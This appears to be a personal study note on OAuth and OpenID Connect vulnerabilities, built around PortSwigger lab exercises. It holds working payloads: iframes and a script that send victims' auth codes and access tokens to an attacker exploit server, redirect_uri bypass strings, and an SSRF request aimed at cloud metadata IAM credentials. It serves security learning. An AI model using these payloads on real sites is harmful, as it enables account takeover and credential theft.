#OAuth #Completed

![[OAuth.jpg]]
# OAuth

OAuth allows the user to grant access to a website without exposing login credentials. The basic process is widely used to integrate third-party functionality that requires access to certain data from a user's account. An app can use OAuth to request access to email contacts to suggest people to connect with, but also allows users to log in with an account on a different site.

OAuth works by defining a series of interactions between three parties:

- Client app - website or web app wanting to access user data
- Resource owner - user whose data the client app wants to access
- OAuth service provider - website or app controlling the user's data and access to it. Supporting OAuth by providing an API for interacting with both an authorization server and a resource server.

There are multiple ways the process is implemented (flows/grant types) including:

- Authorization code
- Implicit grant type

The process follows the following:

1. Client app requests access to subset of user's data, specifying the grant type and the type of access they want.
2. User prompted to log in and give their consent for requested access.
3. Client app receives a unique access token proving they have permission from the user.
4. Client app uses token to make API calls fetching relevant data

OAuth has evolved into a way to authenticate users such as using a social media account to login. The mechanisms remain the same with the difference being how the client app uses the data it receives. It is generally implemented as follows:

1. User chooses social media login.
2. Client app uses the social media site OAuth service to request access to data used to identify user.
3. Once token is received, client app requests data from resource server, likely a `/userinfo` endpoint.
4. Once received, client app uses it in place of a username to log user in.
# Recon

If there is an option to login using an account from a different website, it is a strong indication that OAuth is being used. A reliable way to determine if it is is checking the HTTP messages when using the login function from another site.

Typically, the first request is always a request to `/authorization` and contains a number of query parameters used for OAuth. Look for `client_id`, `redirect_uri`, and `response_type` parameters such as:

```html
GET /authorization?client_id=12345&redirect_uri=https://client-app.com/callback&response_type=token&scope=openid%20profile&state=ae13d489bd00e3c24 HTTP/1.1
Host: oauth-authorization-server.com
```

Study the various interactions that make up the flow. If external OAuth is used, try to identify the specific provider from the hostname where the authorization request is sent. If the services provide a public API, try to look for the detailed documentation through endpoints like:

- `/.well-known/oauth-authorization-server`
- `/.well-known/openid-configuration`

Often, JSON is returned containing details.
# Auth Bypass via OAuth Implicit Flow

Implicit grant types are mainly used for single-page apps, but often used in classic client-server web apps due to simplicity. Access tokens are sent from OAuth to client app via the browser as a URL fragment. Client app accesses the token via JavaScript. 

If the app wants to maintain the session after closing the page, it stores the current user data somewhere. Client apps often submit the data to the server in a POST request and assign a session cookie, logging the user in. The server does not have any secrets or passwords to compare to, which means it is implicitly trusted.

If the client app does not check the access token matches the other data, an attacker can change parameters.

After a client app has received the access token for a user from the OAuth service, it will retrieve information about the user from the OAuth service "user endpoint". The client app will then submit the user's email and access token to their own endpoint for authentication (the access token acts like a traditional password).

However, by changing the email parameter to another user's email, you can potentially log into the app as any arbitrary user, essentially bypassing authentication.

For example, try logging in via a social media option and analysing the requests. Look for a request to something such as `/auth?client_id=`. Look for a POST request in the flow that contains information to `/authenticate`. 

Try changing the email and email/username fields in the authenticate request to another user. If no error appears, it may log in as another user without credentials.

>[!info]
>To work in browser, right click modified request and select "Request in browser" --> "In original session".
# Flawed CSRF Protection

Some components of OAuth flow are optional and some are recommended including the `state` parameter. It should contain an unguessable value such as the hash of something tied to the session when the OAuth flow is initiated. 

Value should be passed around between client app and OAuth service as a CSRF token for client app.

If an authorization request does not send a `state` parameter, it means you can initiate a OAuth flow before tricking a user's browser into completing it, similiar to CSRF attacks. 

For example, if a website allows users to log in using either a classic password or by linking a social media account. If the app fails to use the `state` parameter, you can hijack a victim's account on the client app by binding it to their own social media account.

If the site allows users to login exclusively via OAuth, the `state` parameter is less critical, but not using it can still allow the construction of login CSRF attacks, by tricking the user into logging in to the attacker's account.

For example, after attaching a social media profile to the website, the OAuth flow completes. Try logging out and choosing the "Login with social media" option. Analyse the requests and observe in the `GET /auth?client_id[..]` request that the `redirect_uri` sends the auth code to `/oauth-linking`.

Check that the request does not include a `state` parameter. 

Try attaching a social media profile again and intercepting the `GET /oauth-linking` request and copy the URL but dropping the request to ensure the code is valid. 

To exploit, try creating an iframe where the src points to the URL copied:

```html
<iframe src="https://0aab00ca0453474382a9d54100790080.web-security-academy.net/oauth-linking?code=P17d6L-esQtYDDocuqAlaQFjRTrYP4ejBV2i2Pfriq0"></iframe>
```

Save it in the exploit server and deliver it to the victim to complete the OAuth flow using the attacker social media profile. Attempting to login with social media after exploiting may login as another user.
# Account Hijacking via redirect_uri

Another method is when the config of OAuth enables you to steal auth codes or access tokens for other user accounts. Depending on grant type, either a code or token is sent to victim browser via the `/callback` endpoint specified in `redirect_uri`. 

If OAuth service fails to validate URI properly, a CSRF attack can be constructed, tricking victim browser into initiating an OAuth flow that will send the code/token to an attacker controlled `redirect_uri`.

For authorization code flow, an attacker can steal the victim code before it's used. The code can be sent to the client app's legitimate `/callback` endpoint to get access to the account. Attackers don't need to know the client secret or resulting access token.

If the victim has a valid session with OAuth service, the client app simply completes the code/token exchange on the attacker's behalf before logging them into the victim's account. 

>[!info]
>Using `state` or `nonce` protection does not prevent these attacks since an attacker can create new values from their own.

For example, try completing the full OAuth login process, then log out and back in to check if you are logged in instantly - if so, there is an active session with OAuth. Analyse the OAuth flow and identify the authorization request `GET /auth?client-id=[..]` - when sent, check if it immediately redirects to the URI with the code.

Try submitting any value as the URI to see if errors occur. If not, the input is used to generate the redirect. Try changing the URI to a URL you control and follow the redirect and check logs for your server for an auth code.

To exploit, create an iframe such as the below and send to victims:

```html
<iframe src="https://oauth-YOUR-LAB-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net&response_type=code&scope=openid%20profile%20email"></iframe>
```

Check logs for another leaked code. Log out and use the stolen code via:

```html
https://YOUR-LAB-ID.web-security-academy.net/oauth-callback?code=STOLEN-CODE
```

>[!info]
>Some may require a `redirect_uri` be sent when exchanging the code as well with the server checking whether it matches the one it received initially.
# Flawed redirect_uri Validation

Apps may provide a whitelist of genuine callback URIs when registering with the OAuth service. When the OAuth service receives a new request, it validates the `redirect_uri` parameter against the whitelist.

Try experimenting with the `redirect_uri` parameter to understand its validation. Some may allow for a range of subdirectories by checking that the string starts with the correct sequences (i.e. domain). Try removing or adding paths, query parameters and fragments to see what changes can be made.

If extra values allowed, try exploiting discrepancies between the parsing of the URI. Techniques such as:

```bash
https://default-host.com &@foo.evil-user.net#@bar.evil-user.net/
```

Some may be vulnerable to server-side parameter pollution. Try submitting duplicate `redirect_uri` parameters such as:

```bash
https://oauth-authorization-server.com/?client_id=123&redirect_uri=client-app.com/callback&redirect_uri=evil-user.net
```

Some servers also provide special treatment to localhost URIs since they are used during development. Any redirect URIs beginning with localhost may be accidentally permitted in production, allowing bypasses of validation by registering a domain such as `localhost.evil-user.net`.

Often, try experimenting with different combinations of changes to several parameters such as changing the `response_mode` from `query` to `fragment` which can sometimes alter the parsing of the `redirect_uri`. Or if the `web_message` response mode is supported, try a wider range of subdomains in `redirect_uri`.
# Stealing Codes via Open Redirect

If you cannot submit an external domain as the `redirect_uri`, try and access a wider attack surface within the client app. Try to find whether you can change the `redirect_uri` to point to other pages on a whitelisted domain. Find ways to access different subdomains or paths.

Default URI is often on an OAuth-specific path (`/oauth/callback`) which has no subdirectories. Directory traversal may be used to supply an arbitrary path:

```bash
https://client-app.com/oauth/callback/../../example/path
```

Which is interpreted as:

```bash
https://client-app.com/example/path
```

If you identify other pages to set, audit them for additional vulnerabilities. For authorization code flow, find a vulnerability that gives you access to the query parameters. For the implicit grant type, you need to extract the URL fragment.

Try looking for an open redirect which can be used as a proxy to forward victims to an attacker domain hosting a malicious script. 

For implicit grants, stealing access tokens do not just enable log ins, but allow you to make API calls to OAuth service's resource server and grab sensitive user data.
 
For example, look at the OAuth requests and responses. Look for certain API calls such as user information endpoints like `/me` and see if it uses that information to log in. If so, try re logging in and find the `GET /auth?client_id` request.

Play around with the request and see if you can supply an external domain for `redirect_uri`. If not, try appending directory traversal characters to the end (`/../`). If acceptable, intercept a `GET /auth?client_id` request and change the URL to something such as:

```bash
https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post?postId=1
```

Check all other pages. Blog posts may have a `Next post` option on each post which redirects the users to the path specified in a query parameter:

```bash
https://0aa9008d03ac4e6381f586b100260096.web-security-academy.net/post/next?path=/post?postId=2
```

Analyse the `path` parameter and notice there is an open redirect vulnerability. Attempt to submit an absolute URL. If so, use a URL to combine the vulnerabilities - URL to initiate an OAuth flow with the `redirect_uri` pointing to the open redirect, which forwards the victim to the exploit server:

```bash
https://oauth-0af600c403b94e3681818474020400fd.oauth-server.net/auth?client_id=jbv3s6qop35rszlgvndu1&redirect_uri=https://0aa9008d03ac4e6381f586b100260096.web-security-academy.net/oauth-callback/../post/next?path=https://exploit-0a0a008d03284ec1814e854301d000fa.exploit-server.net/exploit&response_type=token&nonce=399721827&scope=openid%20profile%20email
```

Create a script that extracts the fragment and outputs it such as leaking it via the access log by redirecting users to exploit server for a second time, with access token as a query parameter:

```html
<script>
window.location = '/?'+document.location.hash.substr(1)
</script>
```

Combine them to create an exploit that forces the victim to visit the maliciuos URL and executes the script to steal access tokens:

```html
<script>
    if (!document.location.hash) {
        window.location = 'https://oauth-0af600c403b94e3681818474020400fd.oauth-server.net/auth?client_id=jbv3s6qop35rszlgvndu1&redirect_uri=https://0aa9008d03ac4e6381f586b100260096.web-security-academy.net/oauth-callback/../post/next?path=https://exploit-0a0a008d03284ec1814e854301d000fa.exploit-server.net/exploit&response_type=token&nonce=399721827&scope=openid%20profile%20email'
    } else {
        window.location = '/?'+document.location.hash.substr(1)
    }
</script>
```
# Stealing OAuth Tokens via Proxy Page

Attempt to look for any other vulnerabilities including:

- Dangerous JS that handles query parameters and URL fragments - insecure web messaging scripts can be used. You may need to identify a longer gadget chain that allows you to pass the token through series of scripts before leaking to an external domain.
- XSS vulnerabilities - typically a small time frame where an attacker has access to the user's session. Since HttpOnly is common, it makes it harder. By stealing OAuth code/token, attackers can gain access in the own browser. 
- HTML injection vulnerabilities - if JS is not injectable, try using HTML injection. If you point the `redirect_uri` parameter to a page where you can inject HTML content, it may leak the code via the `Referer` header. As example, consider `img src="evil-user.net"`. When fetching the image, some browsers send the full URL in `Referer`.
# Flawed Scope Validation

In OAuth flows, users approve the requested access based on scope define in the authorization request. The token allows the client app to access only the scope approved by the user. It's possible for an attacker to upgrade a token with extra permissions.

With authorization grant type, user data is requested and sent via secure server-to-server where an attacker is not able to manipulate directly. An attacker can still achieve the same result by registering their own client app with the OAuth service.

If an attacker app requested access to user emails using the `openid email` scope, after the user approves it, the app may receive an authorization code. Attackers can add another `scope` parameter to the code/token exchange containing the additional `profile` scope:

```bash
POST /token
Host: oauth-authorization-server.com
…
client_id=12345&client_secret=SECRET&redirect_uri=https://client-app.com/callback&grant_type=authorization_code&code=a1b2c3d4e5f6g7h8&scope=openid%20 email%20profile
```

If the server does not validate against the scope from the initial request, it sometimes generates an access token using the new scope and send it to the attacker app:

```json
{
    "access_token": "z0y9x8w7v6u5",
    "token_type": "Bearer",
    "expires_in": 3600,
    "scope": "openid email profile",
    …
}
```

For implicit grant types, access tokens are sent via browser meaning an attacker can steal tokens and use them directly. Once stolen, they send a normal request to the OAuth service's `/userinfo` endpoint and manually add a new `scope` parameter.

OAuth service should validate the scope but it may not. If the adjusted permissions do not exceed the level of access granted, an attacker can access additional data.
# Unverified User Registration

When authenticating, client app makes the assumption that the information stored by OAuth provider is correct. Some sites allow users to register an account without verifying all details, including email address. Attackers can register an account with OAuth provider using the same details as a victim. Client app may allow the attacker to sign in as the victim.
# OpenID Connect

OpenID Connect extends OAuth to provide a dedicated identity and authentication layer sitting on top of the basic OAuth implementation. It works by slotting into the normal OAuth flows. The key difference is an additional, standardized set of scopes that are equal for all providers, and an extra response type - `id_token`.

The roles are the same with the difference being the terminology used:

- Relying party - app requesting authentication of a user (OAuth client app)
- End user - user being authenticated (OAuth resource owner)
- OpenID Provider - OAuth service configured to support OpenID Connect

The `claims` refer to key value pairs representing information about the user. All OpenID Connect services uses an identical set of scopes. The client app must specify the scope `openid` in the authorization request to use OpenID Connect.

One or more other standard scopes can be included such as:

- profile
- email
- address
- phone

Each scope corresponds to read access for a subset of claims. For example, `openid profile` grants the client read access to a series of claims including `family_name`, `given_name` and `birth_date`.

The `id_token` response type returns a JWT signed with a JWS. It contains a list of claims based on the scope initially requested and information about how/when the user was last authenticated. Instead of having to get an access token and request user data separately, the ID token containing the data is sent to the client app.

Multiple response types are supported by OAuth. Client apps can send an authorization request with a basic OAuth response type and OpenID Connect's `id_token` response type:

- response_type=id_token token
- response_type=id_token code
# OpenID Connect - Recon

If used, it will be obvious in the authorization request - check for the mandatory `openid` scope. If the login process does not appear to use OpenId, check whether the OAuth service supports it by adding the `openid` scope or changing the response type to `id_token`.

Also look at the OAuth provider's documentation for any useful information about OpenID Connect support. 
# Unprotected Dynamic Client Registration

If dynamic client registration is supported (i.e. allows client apps to register with OpenID provider), client apps can register itself by sending POST request to dedicated `/registration` endpoint.

Client app submits key information in JSON. For example, it's required to include an array of whitelisted redirect URIs. It can also submit a range of additional info, like names of endpoints to expose, name for the app and more:

```json
POST /openid/register HTTP/1.1
Content-Type: application/json
Accept: application/json
Host: oauth-authorization-server.com
Authorization: Bearer ab12cd34ef56gh89

{
    "application_type": "web",
    "redirect_uris": [
        "https://client-app.com/callback",
        "https://client-app.com/callback2"
        ],
    "client_name": "My Application",
    "logo_uri": "https://client-app.com/logo.png",
    "token_endpoint_auth_method": "client_secret_basic",
    "jwks_uri": "https://client-app.com/my_public_keys.jwks",
    "userinfo_encrypted_response_alg": "RSA1_5",
    "userinfo_encrypted_response_enc": "A128CBC-HS256",
    …
}
```

OpenID providers should require the client app to authenticate itself. Some providers allow dynamic client registration without authentication, allowing attackers to register malicious client apps. 

Some properties can be provided as URIs. If any are accessed by the OpenID provider, it can lead to second-order SSRF.

For example, there may be OpenID configuration located at `/.well-known/openid-configuration` such as:

```json
{
  "authorization_endpoint": "https://oauth-0ae900f40368807a89cefce3026d0022.oauth-server.net/auth",
  "claims_parameter_supported": false,
  "claims_supported": [
    "sub",
    "name",
    "email",
    "email_verified",
    "sid",
    "auth_time",
    "iss"
  ],
  "code_challenge_methods_supported": [
    "S256"
  ],
  "end_session_endpoint": "https://oauth-0ae900f40368807a89cefce3026d0022.oauth-server.net/session/end",
  "grant_types_supported": [
    "authorization_code",
    "refresh_token"
  ],
  "id_token_signing_alg_values_supported": [
    "HS256",
    "EdDSA",
    "ES256",
    "PS256",
    "RS256"
  ],
  "issuer": "https://oauth-0ae900f40368807a89cefce3026d0022.oauth-server.net",
  "jwks_uri": "https://oauth-0ae900f40368807a89cefce3026d0022.oauth-server.net/jwks",
  "registration_endpoint": "https://oauth-0ae900f40368807a89cefce3026d0022.oauth-server.net/reg",
  "response_modes_supported": [
    "form_post",
    "fragment",
    "query"
  ],
  "response_types_supported": [
    "code"
  ],
  "scopes_supported": [
    "openid",
    "offline_access",
    "profile",
    "email"
  ],
  "subject_types_supported": [
    "public"
  ],
  "token_endpoint_auth_methods_supported": [
    "none",
    "client_secret_basic",
    "client_secret_jwt",
    "client_secret_post",
    "private_key_jwt"
  ],
  "token_endpoint_auth_signing_alg_values_supported": [
    "HS256",
    "RS256",
    "PS256",
    "ES256",
    "EdDSA"
  ],
  "token_endpoint": "https://oauth-0ae900f40368807a89cefce3026d0022.oauth-server.net/token",
  "request_object_signing_alg_values_supported": [
    "HS256",
    "RS256",
    "PS256",
    "ES256",
    "EdDSA"
  ],
  "request_parameter_supported": false,
  "request_uri_parameter_supported": true,
  "require_request_uri_registration": true,
  "userinfo_endpoint": "https://oauth-0ae900f40368807a89cefce3026d0022.oauth-server.net/me",
  "userinfo_signing_alg_values_supported": [
    "HS256",
    "EdDSA",
    "ES256",
    "PS256",
    "RS256"
  ],
  "introspection_endpoint": "https://oauth-0ae900f40368807a89cefce3026d0022.oauth-server.net/token/introspection",
  "introspection_endpoint_auth_methods_supported": [
    "none",
    "client_secret_basic",
    "client_secret_jwt",
    "client_secret_post",
    "private_key_jwt"
  ],
  "introspection_endpoint_auth_signing_alg_values_supported": [
    "HS256",
    "RS256",
    "PS256",
    "ES256",
    "EdDSA"
  ],
  "revocation_endpoint": "https://oauth-0ae900f40368807a89cefce3026d0022.oauth-server.net/token/revocation",
  "revocation_endpoint_auth_methods_supported": [
    "none",
    "client_secret_basic",
    "client_secret_jwt",
    "client_secret_post",
    "private_key_jwt"
  ],
  "revocation_endpoint_auth_signing_alg_values_supported": [
    "HS256",
    "RS256",
    "PS256",
    "ES256",
    "EdDSA"
  ],
  "claim_types_supported": [
    "normal"
  ]
}
```

There may be a registration endpoint such as `/reg`:

```json
"registration_endpoint": "https://oauth-0ae900f40368807a89cefce3026d0022.oauth-server.net/reg"
```

Attempt to register a client app with OAuth by providing a `redirect_uris` array containing a whitelist of callback URIs for the fake app:

```json
POST /reg HTTP/1.1
Host: oauth-YOUR-OAUTH-SERVER.oauth-server.net
Content-Type: application/json

{
    "redirect_uris" : [
        "https://example.com"
    ]
}
```

If registered without authentication, check the response for metadata including a client ID. Attempt to find a place in the OAuth flow that uses the client ID such as `/client/CLIENT-ID/logo` which may grab the client app's logo.

Attempt to add the `logo_uri` property in the POST request with a domain (Collaborator):

```json
POST /reg HTTP/1.1
Host: oauth-YOUR-OAUTH-SERVER.oauth-server.net
Content-Type: application/json

{
    "redirect_uris" : [
        "https://example.com"
    ],
    "logo_uri": "https://5flx84tpk8qxxw3azxg1mpc5swynmda2.oastify.com"
}
```

Create a new app and modify the request to replace the client ID with the malicious app's ID - check Collaborator for any HTTP requests. If it appears, replace the value with the SSRF target:

```json
POST /reg HTTP/2
Host: oauth-0ae900f40368807a89cefce3026d0022.oauth-server.net
Content-Type: application/json
Content-Length: 140

{
    "redirect_uris" : [
        "https://example.com"
    ],
    "logo_uri": "https://http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/"
}
```

Create a new app again, grab the `client_id` and request the logo again. Check the response for sensitive data.